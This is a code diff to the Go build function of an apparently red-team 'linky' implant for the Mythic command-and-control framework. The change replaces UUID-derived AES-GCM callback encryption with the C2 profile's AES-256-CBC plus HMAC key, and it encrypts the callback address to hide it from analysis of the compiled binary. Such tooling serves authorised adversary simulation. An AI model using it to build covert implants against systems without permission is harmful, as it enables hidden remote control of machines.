@@ -3,8 +3,10 @@ package agent_functions
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/hex"
 	"fmt"
 	"io"
@@ -14,7 +16,6 @@ import (
 	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
-	"github.com/google/uuid"
 )
 
 // Build is called by Mythic each time an operator generates a new payload.
@@ -31,15 +32,28 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 	shellcode, _ := input.BuildParameters.GetBooleanArg("shellcode")
 	debug, _ := input.BuildParameters.GetBooleanArg("debug")
 
-	// payloadUUID is the 36-char UUID string baked into the implant for checkin.
-	// aesKey is the 32-char hex of the 16-byte UUID used as IMPLANT_SECRET.
-	parsedUUID, err := uuid.Parse(input.PayloadUUID)
-	if err != nil {
-		resp.BuildStdErr = fmt.Sprintf("invalid PayloadUUID: %v", err)
+	payloadUUID := input.PayloadUUID
+
+	// Get the AESPSK encryption key from the C2 profile.
+	// Mythic generates a random 32-byte key when the user selects "aes256_hmac".
+	var aesKeyB64 string
+	if len(input.C2Profiles) > 0 {
+		c2 := input.C2Profiles[0]
+		crypto, err := c2.GetCryptoArg("AESPSK")
+		if err == nil && crypto.EncKey != "" {
+			aesKeyB64 = crypto.EncKey
+		}
+	}
+	if aesKeyB64 == "" {
+		resp.BuildStdErr = "linky requires the HTTP C2 profile with AESPSK set to aes256_hmac"
 		return resp
 	}
-	payloadUUID := input.PayloadUUID
-	aesKey := hex.EncodeToString(parsedUUID[:])
+
+	aesKey, err := base64.StdEncoding.DecodeString(aesKeyB64)
+	if err != nil || len(aesKey) != 32 {
+		resp.BuildStdErr = fmt.Sprintf("invalid AESPSK key: %v", err)
+		return resp
+	}
 
 	// The callback host/port come from the C2 profile parameters.
 	// Strip the scheme from callback_host: Mythic returns "https://host", the implant
@@ -114,7 +128,7 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 	cmd.Dir = crateDir
 	cmd.Env = append(os.Environ(),
 		fmt.Sprintf("CALLBACK=%s", encryptedCallback),
-		fmt.Sprintf("IMPLANT_SECRET=%s", aesKey),
+		fmt.Sprintf("IMPLANT_SECRET=%s", aesKeyB64),
 		fmt.Sprintf("PAYLOAD_UUID=%s", payloadUUID),
 		fmt.Sprintf("CALLBACK_URI=%s", callbackURI),
 	)
@@ -159,33 +173,40 @@ func Build(input agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildResp
 	return resp
 }
 
-// encryptCallback encrypts the C2 callback address so it cannot be extracted
-// as a plaintext string from the compiled binary.
-// Output format: hex(nonce_12 || ciphertext) — must match Rust decrypt_config().
-func encryptCallback(callback, secret string) string {
-	// derive_key: SHA-256(secret || "mythic-salt") — mirrors Rust derive_key()
-	h := sha256.New()
-	h.Write([]byte(secret))
-	h.Write([]byte("mythic-salt"))
-	key := h.Sum(nil) // 32 bytes
+// encryptCallback encrypts the C2 callback address using AES-256-CBC + HMAC-SHA256,
+// matching the Mythic wire format. Output: hex(IV_16 || ciphertext || HMAC_32).
+func encryptCallback(callback string, key []byte) string {
+	iv := make([]byte, aes.BlockSize)
+	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
+		return callback
+	}
+
+	plaintext := pkcs7Pad([]byte(callback), aes.BlockSize)
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return callback // fallback to plaintext if crypto fails
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
 		return callback
 	}
+	ciphertext := make([]byte, len(plaintext))
+	cipher.NewCBCEncrypter(block, iv).CryptBlocks(ciphertext, plaintext)
 
-	nonce := make([]byte, gcm.NonceSize()) // 12 bytes
-	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
-		return callback
+	ivCt := append(iv, ciphertext...)
+	mac := hmac.New(sha256.New, key)
+	mac.Write(ivCt)
+	hmacBytes := mac.Sum(nil)
+
+	return hex.EncodeToString(append(ivCt, hmacBytes...))
+}
+
+// pkcs7Pad pads data to a multiple of blockSize using PKCS#7.
+func pkcs7Pad(data []byte, blockSize int) []byte {
+	padding := blockSize - len(data)%blockSize
+	padded := make([]byte, len(data)+padding)
+	copy(padded, data)
+	for i := len(data); i < len(padded); i++ {
+		padded[i] = byte(padding)
 	}
-
-	ct := gcm.Seal(nil, nonce, []byte(callback), nil)
-	blob := append(nonce, ct...)
-	return hex.EncodeToString(blob)
+	return padded
 }
 
 // RegisterAllCommands registers every linky command with the Mythic container.
